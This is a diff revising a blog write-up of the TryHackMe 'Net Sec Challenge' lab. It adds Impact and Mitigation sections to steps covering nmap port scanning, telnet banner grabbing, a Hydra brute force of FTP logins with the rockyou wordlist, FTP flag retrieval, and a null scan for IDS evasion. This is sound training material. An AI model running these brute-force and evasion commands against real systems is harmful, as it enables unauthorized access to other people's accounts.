@@ -1,8 +1,8 @@
 ---
 title: "Weak Authentication – FTP Brute Force Leading to Unauthorized Access | Net Sec Challenge"
 date: 2026-03-26 00:00:00 +0530
-categories: [Network Security, Authentication]
-tags: [weak-authentication, brute-force, ftp, hydra, enumeration, service-enumeration, credential-compromise, linux, tryhackme]
+categories: [Penetration Testing]
+tags: [weak-authentication, brute-force, ftp, hydra, enumeration, service-enumeration, credential-compromise, linux, tryhackme, nmap, ids-evasion]
 platform: TryHackMe
 author: Shivansh Sharma
 image:
@@ -10,38 +10,29 @@ image:
   alt: Net Sec Challenge
 ---
 
-# Net Sec Challenge
+## Overview
+This lab focuses on performing a complete network penetration testing workflow, starting from reconnaissance to exploitation. It highlights weak authentication mechanisms in an FTP service that can be exploited using brute-force techniques.
 
-## 📌 Overview
-This lab focuses on applying core network security concepts including enumeration, service interaction, and credential brute-forcing.
+The challenge also introduces service enumeration, banner grabbing, and basic IDS evasion techniques.
 
----
+## Objective
+- Identify open ports and services
+- Perform service-level enumeration
+- Extract exposed information from banners
+- Exploit weak authentication using brute-force
+- Retrieve flags from multiple services
+- Bypass basic IDS detection mechanisms
 
-## 🎯 Objective
-- Identify open ports  
-- Enumerate running services  
-- Extract hidden flags  
-- Gain FTP access using brute-force  
+## Reconnaissance
 
----
-
-## 🛠️ Tools Used
-- Nmap  
-- Telnet  
-- Hydra  
-- FTP  
-
----
-
-## 🔍 Enumeration
-
-We begin with a default Nmap scan:
+### Initial Port Scan
+We begin with a standard Nmap scan to identify commonly exposed services:
 
 ```bash
 nmap <target_IP>
 ```
 
-**Result**
+### Result
 
 ```
 PORT     STATE SERVICE
@@ -52,15 +43,21 @@ PORT     STATE SERVICE
 8080/tcp open  http-proxy
 ```
 
-Highest port under 10,000: **8080**
+### Analysis
 
-Perform a full port scan:
+* Only top 1000 ports are scanned by default
+* Web services and SMB are exposed
+* Port 8080 is the highest detected so far
+
+### Full Port Scan
+
+To ensure no hidden services are missed:
 
 ```bash
 nmap -p- -T4 <target_IP>
 ```
 
-**Result**
+### Result
 
 ```
 PORT      STATE SERVICE
@@ -72,19 +69,20 @@ PORT      STATE SERVICE
 10021/tcp open  unknown
 ```
 
-Open port above 10,000: **10021** | Total open TCP ports: **6**
+### Key Finding
 
----
+* Port 10021 is exposed outside the default scan range
+* Likely a custom or non-standard service (later identified as FTP)
 
-## 🎯 Service Enumeration
+## Service Enumeration
 
-### HTTP Header Enumeration
+### HTTP Enumeration (Port 80)
 
 ```bash
 nmap -sV -sC -p80 <target_IP> -T4
 ```
 
-**Result**
+### Result
 
 ```
 http-server-header: lighttpd THM{web_server_25352}
@@ -92,15 +90,18 @@ http-server-header: lighttpd THM{web_server_25352}
 
 🚩 Flag: `THM{web_server_25352}`
 
----
+### Insight
 
-### SSH Banner Grabbing
+* Server header disclosure reveals both software and sensitive data
+* Misconfigured headers can leak internal information
+
+### SSH Banner Grabbing (Port 22)
 
 ```bash
 telnet <target_IP> 22
 ```
 
-**Result**
+### Result
 
 ```
 SSH-2.0-OpenSSH_8.2p1 THM{946219583339}
@@ -108,31 +109,43 @@ SSH-2.0-OpenSSH_8.2p1 THM{946219583339}
 
 🚩 Flag: `THM{946219583339}`
 
----
+### Insight
 
-### FTP Service Detection
+* SSH banners often reveal version information
+* In this case, it directly exposes a flag
+
+### FTP Service Discovery (Port 10021)
 
 ```bash
 nmap -sV -sC -p10021 <target_IP> -T4
 ```
 
-**Result**
+### Result
 
 ```
 10021/tcp open  ftp     vsftpd 3.0.5
 ```
 
-FTP Version: **vsftpd 3.0.5**
+### Key Observation
 
----
+* FTP is running on a non-standard port
+* Version disclosure: vsftpd 3.0.5
+* Indicates potential for authentication attacks
 
-## 🔐 Exploitation (FTP Brute Force)
+## Exploitation – FTP Brute Force
 
-We are given usernames:
-- `eddie`
-- `quinn`
+### Why Brute Force?
 
-### Step 1: Create Username File
+FTP commonly relies on username/password authentication. Weak credentials make it a prime target.
+
+We are provided with two usernames:
+
+```
+eddie
+quinn
+```
+
+### Step 1: Prepare Username List
 
 ```bash
 nano username.txt
@@ -143,33 +156,36 @@ eddie
 quinn
 ```
 
-### Step 2: Brute Force Credentials
+### Step 2: Perform Brute Force Attack
 
 ```bash
 hydra -L username.txt -P /usr/share/wordlists/rockyou.txt ftp://<target_IP>:10021
 ```
 
-**Result**
+### Result
 
 ```
 login: eddie   password: jordan
 login: quinn   password: andrea
 ```
 
-### Step 3: Access FTP
+### Insight
+
+* Weak passwords allowed successful compromise
+* No rate limiting or account lockout was implemented
+
+### Step 3: Access FTP Service
 
 ```bash
 ftp <target_IP> 10021
 ```
 
-**Login:**
+**Login Credentials**
 
-```
-Username: quinn
-Password: andrea
-```
+* Username: `quinn`
+* Password: `andrea`
 
-### Step 4: Retrieve Flag
+### Step 4: Retrieve Sensitive Data
 
 ```bash
 ls -la
@@ -179,40 +195,68 @@ cat ftp_flag.txt
 
 🚩 Flag: `THM{321452667098}`
 
----
+## IDS Evasion – Null Scan
 
-## 🕵️ IDS Evasion (Stealth Scan)
+The challenge on port 8080 required bypassing detection mechanisms.
 
-The challenge on port 8080 requires avoiding detection by an IDS.
+### Technique Used
 
 ```bash
 nmap -sN <target_IP>
 ```
 
-🔎 `-sN` sends packets without flags, helping evade basic IDS detection.
+### Explanation
 
-**Result**
+* `-sN` sends TCP packets with no flags set
+* Many basic IDS systems fail to log or detect such packets
+* Useful for stealth scanning
 
-After performing the scan and refreshing the challenge page:
+### Result
+
+After refreshing the challenge page:
 
 🚩 Flag: `THM{f7443f99}`
 
----
+## Impact
 
-## 🧠 Key Learnings
+This scenario demonstrates multiple real-world risks:
 
-- Default Nmap scans cover only top 1000 ports
-- Full scans (`-p-`) reveal hidden services
-- Service enumeration (`-sV -sC`) exposes useful data
-- Telnet can be used for banner grabbing
-- Hydra is effective for brute-force attacks
-- FTP may expose sensitive files
-- Null scans (`-sN`) help evade detection
+* Exposure of hidden services due to incomplete scanning
+* Information disclosure via banners
+* Weak authentication leading to unauthorized access
+* Lack of brute-force protection mechanisms
+* Sensitive data accessible via FTP
 
----
+In real environments, this could lead to:
 
-## 📌 Conclusion
+* Data breaches
+* Credential reuse attacks
+* Lateral movement within networks
 
-This lab demonstrates a complete attack workflow:
+## Mitigation
 
-**Enumeration → Service Discovery → Credential Attack → Exploitation → Flag Retrieval**
+To secure systems against such attacks:
+
+* Enforce strong password policies
+* Implement account lockout and rate limiting
+* Disable unnecessary services and ports
+* Avoid exposing banners with sensitive information
+* Use intrusion detection and prevention systems properly configured
+* Restrict FTP access or replace with secure alternatives (SFTP)
+
+## Key Learnings
+
+* Default scans are not sufficient — always perform full port scans
+* Service enumeration reveals critical information
+* Banner grabbing can expose sensitive data
+* Weak authentication is a major security risk
+* Brute-force attacks are highly effective without protections
+* IDS evasion techniques can bypass poorly configured defenses
+
+## Conclusion
+
+This lab demonstrates a full penetration testing workflow:
+
+Reconnaissance → Enumeration → Service Analysis → Credential Attack → Exploitation → Post-Exploitation
+
+It highlights how small misconfigurations, when combined, can lead to complete system compromise.
